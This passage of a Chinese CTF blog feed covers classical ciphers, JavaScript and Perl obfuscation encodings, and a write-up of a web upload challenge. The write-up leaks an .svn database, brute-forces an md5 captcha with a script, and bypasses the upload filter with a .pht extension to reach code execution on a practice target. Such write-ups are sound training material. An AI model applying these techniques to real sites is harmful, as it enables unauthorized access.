DOG&#39;)&#39;ESZWQAFHGTDKWHRKUENYQOLMQTUNWMBPTGHQ&#39;&gt;&gt;&gt;fs.decipher(&#39;ESZWQAFHGTDKWHRKUENYQOLMQTUNWMBPTGHQ&#39;)&#39;THEQUICKBROWNFOXJUMPSOVERTHELAZYDOG&#39;</code></pre><p>在线加解密 <a href="http://www.practicalcryptography.com/ciphers/classical-era/four-square/" target="_blank" rel="noopener">传送门</a></p><h4 id="（3）未知密钥矩阵破解"><a href="#（3）未知密钥矩阵破解" class="headerlink" title="（3）未知密钥矩阵破解"></a>（3）未知密钥矩阵破解</h4><p>推荐一篇关于采用 <a href="http://blog.csdn.net/xianlingmao/article/details/7798647" target="_blank" rel="noopener">模拟退火算法</a> 的 <a href="http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-foursquare-cipher/" target="_blank" rel="noopener">四方密码分析</a> 文章，如果有足够多的密文那么四方密码可以轻易被破解，如果知道了明文和密文推出密钥是很容易的，猜测部分明文是一个有效的方法去破解四方密码，如果一部分明文已知或者可以被猜测出 那么我们首先要确定尽可能多可利用的密钥，然后才可以进行更多的推测或者用其他的方法破译。基于四方密码分析一文实现的 <a href="http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-foursquare-cipher/" target="_blank" rel="noopener">C代码</a> 破解示例：</p><p>密文(密文最好在200个字符以上)：</p><p>HMMKEQESDTMDHLAWFWMNKSOSFOMRFNLWLKHNSQGGEKXEOLLVDXNRSQQGARTFKSAVNUDLFNDHESPZGQ TWESAGPGSQSQSTPKUSBBQLQHESAGPGSQSQGXLNAVHTPMHMKKNYGSUGDMTPDGFNKYAVHXLWGEKRILESLZ ZOFNAVIHRHRKAGHSMYUGEGNSRGAVMVOQPRLNKRXLMYLQPXILESQYBNRHRKAGKYQXDIHMPGPYOERZOLBEZ LURFWLWUOLDDPNSQYAGMUQPQWESBEZVEQESDTMDBQLWDIUSHB</p><p>用法：</p><pre><code>#!shellgcc -O3 -lm foursquarecrack2.c scoreText_2.c -o fsc./fsc</code></pre><p>输出结果：</p><pre><code>#!shellRunning foursquarecrack, this could take a few minutes... best score so far: -1239.505249, on iteration 1Key: &#39;KFMLUGWSQEPOZTNRBHDAVXCIY&#39;,&#39;UGSVKFIZMOYXPQRWTHLNCABED&#39;     plaintext: &#39;THECIPHERTEXTSQUARESCANBEGENERATEDUSINGAKEYWORDDROPPINGDUPLICAT            ELETTERSTHENFILLTHEREMAININGSPACESWITHTHEREMAININGLETTERSOFTHEA            LPHABETINORDERALTERNATIVELYTHECIPHERTEXTSQUARESCANBEGENERATEDCO            MPLETELYRANDOMLYTHEFOURSQUAREALGORITHMALLOWSFORTWOSEPARATEKEYSO            NEFOREACHOFTHETWOCIPHERTEXTMATRICESX&#39;</code></pre><h3 id="2-棋盘密码"><a href="#2-棋盘密码" class="headerlink" title="2.棋盘密码"></a>2.棋盘密码</h3><p>棋盘密码（Checkerboard Cipher)是使用一个波利比奥斯方阵和两个密钥作为密阵的替换密码，通常在波利比奥斯方阵中J字母往往被包含在I字母中。</p><p>示例密阵：</p><pre><code>#!shell   Q  U  I  C  K  --------------B |K  N I/J G  HR |P  Q  R  S  TO |O  Y  Z  U  AW |M  X  W  V  BN |L  F  E  D  C</code></pre><p>经过密阵替换:</p><pre><code>#!shell明文:T  H  E  Q  U  I  C  K  B  R  O  W  N  F  O  X密文:RK BK RU OC OC BI NK BQ WK RI OQ WI BU NU OQ WU</code></pre><h3 id="23-跨棋盘密码"><a href="#23-跨棋盘密码" class="headerlink" title="23.跨棋盘密码"></a>23.跨棋盘密码</h3><p>跨棋盘密码(Straddle Checkerboard Cipher)是一种替换密码，当这种密码在结合其他加密方式，加密效果会更好。</p><p>棋盘示例(选择3和7作为变换):</p><pre><code>#!shell   0 1 2 3 4 5 6 7 8 9   f k m   c p d   y e3: h b i g q r o s a z7: l u t j n w v x</code></pre><p>明文: <code>T H E Q U I C K B R O W N F O X</code></p><p>经过加密棋盘替换得到密文: <code>72 30 9 34 71 32 4 1 31 35 36 75 74 0 36 77</code></p><p>当然我们还可以继续用其他的加密方式在对跨棋盘密码加密出的结果再进行加密:</p><p>示例变换密钥:83729</p><pre><code>#!shell     8372983729837298372983729837    +7230934713241313536757403677    -----------------------------     5502817432078501808630122404</code></pre><p>在经过棋盘转换后:</p><pre><code>#!shell5502817432078501808630122404ppfmyk n if  pfkyfyd hkmmcfc</code></pre><p>最终得到密文: ppfmyk n if pfkyfyd hkmmcfc</p><p>在线加解密 <a href="http://www.practicalcryptography.com/ciphers/classical-era/straddle-checkerboard/" target="_blank" rel="noopener">传送门</a></p><h3 id="24-分组摩尔斯替换密码"><a href="#24-分组摩尔斯替换密码" class="headerlink" title="24.分组摩尔斯替换密码"></a>24.分组摩尔斯替换密码</h3><p>分组摩尔斯替换密码(Fractionated Morse Cipher)首先把明文转换为莫尔斯电码，不过每个字母之间用 <code>x</code> 分开，每个单词用 <code>xx</code> 分开。然后使用密钥生成一个替换密表，这个密表包含所有 <code>. - x</code> 组合的情况(因为不会出现 <code>xxx</code> 的情况，所以一共26种组合)。</p><p>密钥: <code>MORSECODE</code></p><p>密表:</p><pre><code>#!shellMORSECDABFGHIJKLNPQTUVWXYZ.........---------XXXXXXXX...---XXX...---XXX...---XX.-X.-X.-X.-X.-X.-X.-X.-X.-</code></pre><p>说明:密表下半部分是固定的，密表的安全性以及加密效果主要取决于使用的密钥。</p><p>明文： <code>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG</code></p><p>(类似)摩尔斯电码:</p><pre><code>#!shell-x....x.xx--.-x..-x..x-.-.x-.-xx-...x.-.x---x.--x-.xx..-.x---x-..-xx.---x..- --x.--.x...xx---x...-x.x.-.xx-x....x.xx.-..x.-x--..x-.--xx-..x---x--.</code></pre><p>说明:明文在转换为(类似)摩尔斯电码后进行每3个字符分组，再进行密表的查表。</p><p>密文(经过密表替换): <code>LMUWC OQVHG ZMTAK EVYSW NOYJQ NLIQB JQCDH XMDYF TWRGP FWNH</code></p><p>已知密钥在线加解密 <a href="http://ruffnekk.stormloader.com/fractmorse_tool.html" target="_blank" rel="noopener">传送门</a></p><h3 id="25-Bazeries密码"><a href="#25-Bazeries密码" class="headerlink" title="25.Bazeries密码"></a>25.Bazeries密码</h3><p>Bazeries密码(Bazeries Cipher)是换位密码和替换密码的组合，使用两个波利比奥斯方阵，一个明文字母方阵，使用一个随机的数字(一般小于1000000)的生成一个密钥矩阵同时作为第一轮明文划分分组，比如2333这个数字翻译为英文便是TWO THOUSAND THREE HUNDRED THIRTY THREE,从第一个字母T开始选取不重复的字母，之后再从字母表中按序选取没有出现的字母组成密钥矩阵。</p><p>明文: <code>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG</code></p><p>随机数字: <code>2333</code></p><p>明文矩阵:</p><pre><code>#!shellA  F  L  Q  VB  G  M  R  WC  H  N  S  XD I/J O  T  YE  K  P  U  Z</code></pre><p>示例密钥矩阵:</p><pre><code>#!shellT  W  O  H  US  A  N  D  RE I/J Y  B  CF  G  K  L  MP  Q  V  X  Z</code></pre><p>明文分组:</p><pre><code>#!shell2   3   3   3   2   3   3   3  2   3   3  3TH EQU ICK BRO WN FOX JUM PSO VE RTH ELA ZYD OG</code></pre><p>分组明文反序:</p><pre><code>#!shellHT UQE KCI ORB WN XOF MUJ OSP EV EHT ALE DYZ GO</code></pre><p>使用密钥矩阵替换:</p><pre><code>#!shellIL XHP QEG KDS YR CKW NXG KBV PU ILD TOP FMZ AK</code></pre><p>(比如’H’在明文矩阵对应到密钥矩阵的位置就是’I’）</p><p>已知密钥在线加解密 <a href="http://ruffnekk.stormloader.com/bazeries_tool.html" target="_blank" rel="noopener">传送门</a></p><h3 id="26-Digrafid密码"><a href="#26-Digrafid密码" class="headerlink" title="26.Digrafid密码"></a>26.Digrafid密码</h3><p>Digrafid密码(Digrafid Cipher)使用两个密钥生成分别生成类似波利比奥斯方阵的3x9方格的密表。，主要有3分组和4分组两类。</p><p>第一个方阵密钥: <code>digrafid</code></p><p>第二个方阵密钥: <code>cipher</code></p><p>密表：</p><pre><code>#!shell1 2 3 4 5 6 7 8 9D I G R A F D B C 1 2 3E H J L M N O P Q 4 5 6S T U V W X Y Z # 7 8 9                  c f s 1                  i g t 2                  p j u 3                  h k v 4                  e l w 5                  r m x 6                  a n y 7                  b o z 8                  d q # 9</code></pre><p>明文: <code>THE QUICK BROWN FOX</code></p><p>密表转换(以4分组为例):</p><pre><code>#!shellTh Eq Ui Ck   Br Ow Nf Ox2  1  3  9    8  7  6  77  5  7  2    1  6  5  64  9  2  4    6  5  1  6</code></pre><p>说明:T在第一矩阵第2列，h在第二矩阵第4行，T所在的行与h所在的列相交的位置数字为7，所以Th表示为274。</p><p>转换密文:</p><pre><code>#!shell213 975 724 924   876 716 566 516Ip  #e  Dk  Ck    Zr  Dr  Mx  Ar</code></pre><h3 id="27-格朗普雷密码"><a href="#27-格朗普雷密码" class="headerlink" title="27.格朗普雷密码"></a>27.格朗普雷密码</h3><p>格朗普雷密码(Grandpré Cipher)是替换密码的一种，一般使用8个8字母的单词横向填充8x8方阵，且第一列为一个单词，并且在方阵中26个字母都必须出现一次以上。</p><p>示例密阵:</p><p><img src="http://cdn.sijiu.ren/blog/20200426/NTYy5xiX6t2S.jpg?imageslim" alt="mark"></p><pre><code>#!shell明文:T  H  E  Q  U  I  C  K  B  R  O  W  N  F  O 密文:84 27 82 41 51 66 31 36 15 71 67 73 52 34 67</code></pre><p>说明：明文中的字母在密阵位置可能不止一个，所以加密结果可能有多种，但是不影响解密。密阵还有6x6，7x7，9x9,10x10几种。显然密阵越大每个字母被替换的情况就可能越多，那么加密效果就更好。</p><h3 id="28-比尔密码"><a href="#28-比尔密码" class="headerlink" title="28.比尔密码"></a>28.比尔密码</h3><p>比尔密码(Beale ciphers)有三份密码，当然这里说的是已被破解第二份，是一种类似书密码的替换密码。</p><p><img src="http://cdn.sijiu.ren/blog/20200426/frds4Utew7vc.png?imageslim" alt="mark"></p><p>以第二密码为例，每一个数字代表美国《独立宣言》的文本中的第几个词的首字母，如1代表第1个词的首字母“w”，2代表第2个词首字母“i”。解密后的文字如下：</p><p>I have deposited in the county of Bedford…</p><p>比尔密码还有一段有趣的故事，感兴趣可以看一下比尔密码的 <a href="https://zh.wikipedia.org/wiki/比尔密码" target="_blank" rel="noopener">详细介绍</a> 。</p><h3 id="29-键盘密码"><a href="#29-键盘密码" class="headerlink" title="29.键盘密码"></a>29.键盘密码</h3><p>一般用到的键盘密码就是手机键盘和电脑键盘两种，2014 0ctf比赛里Crypto类型中Classic一题就是电脑键盘密码，详细可以 <a href="http://www.programlife.net/0ops-ctf-writeup.html" target="_blank" rel="noopener">参考</a> ，另外给出另外一些 <a href="http://www.secbox.cn/hacker/ctf/8078.html" target="_blank" rel="noopener">参考</a> 情况。</p><h2 id="其他有趣的机械密码"><a href="#其他有趣的机械密码" class="headerlink" title="其他有趣的机械密码"></a>其他有趣的机械密码</h2><h3 id="1-恩尼格玛密码"><a href="#1-恩尼格玛密码" class="headerlink" title="1.恩尼格玛密码"></a>1.恩尼格玛密码</h3><p>恩尼格玛密码机（德语：Enigma，又译哑谜机，或“谜”式密码机）是一种用于加密与解密文件的密码机。确切地说，恩尼格玛是对二战时期纳粹德国使用的一系列相似的转子机械加解密机器的统称，它包括了许多不同的型号，为密码学对称加密算法的流加密。详细工作原理参考 <a href="https://zh.wikipedia.org/wiki/恩尼格玛密码机" target="_blank" rel="noopener">维基百科</a> 。</p><p><img src="http://cdn.sijiu.ren/blog/20200426/6U3561tNTOC4.jpg?imageslim" alt="mark"></p><p>在线模拟 <a href="http://enigmaco.de/enigma/enigma.html" target="_blank" rel="noopener">传送门</a></p><p>感兴趣可以观看 <a href="http://list.youku.com/albumlist/show?id=23400097&ascending=1&page=1" target="_blank" rel="noopener">播单:计算机历史文化课</a></p><h2 id="代码混淆加密"><a href="#代码混淆加密" class="headerlink" title="代码混淆加密"></a>代码混淆加密</h2><p>\1. <a href="http://www.zhaoyuanma.com/aspfix.html" target="_blank" rel="noopener">asp混淆加密</a></p><p>2.[php language=”混淆加密”][/php] <a href="http://www.zhaoyuanma.com/phpjmvip.html" target="_blank" rel="noopener">118</a></p><p>3.[css language=”/js混淆加密”][/css] <a href="http://tool.css-js.com/" target="_blank" rel="noopener">119</a></p><p>\4. <a href="http://www.zhaoyuanma.com/aspfix.html" target="_blank" rel="noopener">VBScript.Encode混淆加密</a></p><h3 id="5-ppencode"><a href="#5-ppencode" class="headerlink" title="5.ppencode"></a>5.ppencode</h3><p>ppencode-Perl把Perl代码转换成只有英文字母的字符串。</p><p><img src="http://cdn.sijiu.ren/blog/20200426/AeS0BftDEjfz.png?imageslim" alt="mark"></p><p>ppencode <a href="http://namazu.org/~takesako/ppencode/demo.html" target="_blank" rel="noopener">传送门</a></p><h3 id="6-rrencode"><a href="#6-rrencode" class="headerlink" title="6.rrencode"></a>6.rrencode</h3><p>rrencode可以把ruby代码全部转换成符号。</p><p><img src="http://cdn.sijiu.ren/blog/20200426/zVKRRCDS9bDT.jpg?imageslim" alt="mark"></p><p>rrencode <a href="http://www.lab2.kuis.kyoto-u.ac.jp/~yyoshida/rrencode.html" target="_blank" rel="noopener">传送门</a></p><h3 id="7-jjencode-aaencode"><a href="#7-jjencode-aaencode" class="headerlink" title="7.jjencode/aaencode"></a>7.jjencode/aaencode</h3><p>jjencode将JS代码转换成只有符号的字符串，类似于rrencode，介绍的 <a href="http://utf-8.jp/public/20090710/jjencode.pps" target="_blank" rel="noopener">PPT</a> ，aaencode可以将JS代码转换成常用的网络表情，也就是我们说的颜文字js加密。</p><p><img src="http://cdn.sijiu.ren/blog/20200426/dimOfH4zfLmE.png?imageslim" alt="mark"></p><p>aaencode <a href="http://utf-8.jp/public/aaencode.html" target="_blank" rel="noopener">传送门</a></p><p>jjencode/aaencode的解密直接在浏览器的控制台里输入密文即可执行解密，想要详细了解jjencode是如何进行请 <a href="http://pferrie2.tripod.com/papers/jjencode.pdf" target="_blank" rel="noopener">参考</a> ，你也可以在github上 <a href="https://github.com/jacobsoo/Decoder-JJEncode" target="_blank" rel="noopener">下载</a> 实现jjdecoder的源码进行分析。</p><p><img src="http://cdn.sijiu.ren/blog/20200426/b5bT9qPVbqkU.png?imageslim" alt="mark"></p><h3 id="8-JSfuck"><a href="#8-JSfuck" class="headerlink" title="8.JSfuck"></a>8.JSfuck</h3><p>JSFuck 可以让你只用 6 个字符 <code>[ ]( ) ! +</code> 来编写 JavaScript 程序。</p><p><img src="http://cdn.sijiu.ren/blog/20200426/uGKqKcDH0gjG.png?imageslim" alt="mark"></p><p>JSfuck <a href="http://www.jsfuck.com/" target="_blank" rel="noopener">传送门</a></p><h3 id="9-jother"><a href="#9-jother" class="headerlink" title="9.jother"></a>9.jother</h3><p>jother是一种运用于javascript语言中利用少量字符构造精简的匿名函数方法对于字符串进行的编码方式。其中8个少量字符包括： <code>! + ( ) [ ] { }</code> 。只用这些字符就能完成对任意字符串的编码。</p><p><a href="http://drops.wooyun.org/author/do9gy" target="_blank" rel="noopener">do9gy</a> 的 <a href="http://drops.wooyun.org/web/4410" target="_blank" rel="noopener">jother编码之谜</a></p><p><img src="http://cdn.sijiu.ren/blog/20200426/3Coa1skaNUSw.png?imageslim" alt="mark"></p><p>jother编码 <a href="http://tmxk.org/jother/" target="_blank" rel="noopener">传送门</a></p><p>jother直接在浏览器(IE可以)的控制台里输入密文即可执行解密：</p><p><img src="http://cdn.sijiu.ren/blog/20200426/WlyVhvVNeyk6.png?imageslim" alt="mark"></p><h3 id="10-brainfuck"><a href="#10-brainfuck" class="headerlink" title="10.brainfuck"></a>10.brainfuck</h3><p>Brainfuck是一种极小化的计算机语言，按照”Turing complete（完整图灵机）”思想设计的语言，它的主要设计思路是：用最小的概念实现一种“简单”的语言，BrainF**k 语言只有八种符号，所有的操作都由这八种符号( <code>&gt; &lt; + - . , [ ]</code> )的组合来完成。</p><p>明文：hello!</p><pre><code>#!shell+++++ +++++ [-&gt;++ +++++ +++&lt;] &gt;++++ .---. +++++ ++..+ ++.&lt;+ +++++ +++++[-&gt;++ +++++ ++++&lt; ]&gt;+++ ++++. &lt;++++ +++[- &gt;---- ---&lt;] &gt;--.&lt; +++++ ++[-&gt;----- --&lt;]&gt; ----- ----- .&lt;</code></pre><p>brainfuck <a href="http://www.splitbrain.org/services/ook" target="_blank" rel="noopener">传送门</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[toc]&lt;/p&gt;
&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;正文开始之前先闲扯几句吧，玩CTF的小伙伴也许会遇到类似这样的问题:师傅，你知道这是什么加密吗？其实CTF中脑洞密
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>Hi,CTFer!u should be a fast man:)</title>
    <link href="http://yoursite.com/2020/04/23/i-CTFer-u-should-be-a-fast-man/"/>
    <id>http://yoursite.com/2020/04/23/i-CTFer-u-should-be-a-fast-man/</id>
    <published>2020-04-22T16:47:14.782Z</published>
    <updated>2020-06-20T04:37:09.172Z</updated>
    
    <content type="html"><![CDATA[<hr><p>记录做过的一道i春秋  upload题</p><p>页面打开显示下图</p><p><img src="http://cdn.sijiu.ren/blog/20200426/j48hdVwjO86H.png?imageslim" alt></p><p>查看源代码没啥发现。。。</p><p>burp抓包，发现响应头有flag值的字符串</p><p><img src="http://cdn.sijiu.ren/blog/20200426/mj6IK9V7jmoN.png?imageslim" alt></p><p>bese64解码</p><p><img src="http://cdn.sijiu.ren/blog/20200426/5hDaw2uYBrB2.png?imageslim" alt></p><p>再次base64解码</p><p>得到一组数值</p><p>源代码提示将得到的内容POST</p><p><img src="http://cdn.sijiu.ren/blog/20200426/ci0ALia2U8gj.png?imageslim" alt></p><p>返回新的响应头flag值，脚本跑看看</p><pre><code class="python">#!/usr/bin/env python3import base64import requestsurl = &quot;http://9e05cc717ffc4e4da52b8203470cdf6f6fca6fdb7574432a.changame.ichunqiu.com/&quot;url_a = requests.session()a = url_a.get(url).headers[&#39;FLAG&#39;]key_a = base64.b64decode(a)key = str(key_a).split(&#39;:&#39;)key = key[1][1:-1]key = base64.b64decode(key)data = {&quot;ichunqiu&quot;:key}get = url_a.post(url,data = data)print(get.text)</code></pre><p>跑出来一个路径</p><p><img src="http://cdn.sijiu.ren/blog/20200426/yNoOlvtzX07C.png?imageslim" alt="mark"></p><p>点击按钮进入</p><p><img src="http://cdn.sijiu.ren/blog/20200426/N12UexooQa8F.png?imageslim" alt></p><p>通过扫描目录发现有/.svn目录提示403</p><p>svn泄露得到/.svn/wc.db</p><p><img src="http://cdn.sijiu.ren/blog/20200426/LI0fxYL7ynLG.png?imageslim" alt></p><p>md5解码，用得到的md5(8638d5263ab0d3face193725c23ce095)进行登录，密码随便填</p><p>下面是验证码md5脚本：</p><pre><code class="python">#!/usr/bin/env python3import hashlibimport itertools as itswords = &quot;1234568790abcdefghijklmnopqrstuvwxyz&quot;r = its.product(words, repeat=5)for i in r:    a = &quot;&quot;.join(i)    md5 = hashlib.md5(a.encode(&#39;utf-8&#39;)).hexdigest()    if(md5[0:6] == &#39;aa2cec&#39;):        print a        break</code></pre><p>提示新页面</p><p><img src="http://cdn.sijiu.ren/blog/20200426/ziPRz1Eb7eqf.png?imageslim" alt></p><p>文件上传。。。</p><p><img src="http://cdn.sijiu.ren/blog/20200426/l1eGreuYo924.png?imageslim" alt="mark"></p><p>php、php3、php4、php5、php7、pht、phtml、phps 能被解析的后缀</p><p>一个个试过去发现pht能被解析</p><p>burp改包得到flag</p><p><u>参考：<a href="https://writeup.ctfhub.com/Skill/Web/信息泄露/7a999d34.html" target="_blank" rel="noopener">https://writeup.ctfhub.com/Skill/Web/信息泄露/7a999d34.html</a></u></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;hr&gt;
&lt;p&gt;记录做过的一道i春秋  upload题&lt;/p&gt;
&lt;p&gt;页面打开显示下图&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://cdn.sijiu.ren/blog/20200426/j48hdVwjO86H.png?imageslim&quot; alt&gt;&lt;/p&gt;
&lt;p&gt;查看源代
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
  </entry>
  
</feed>
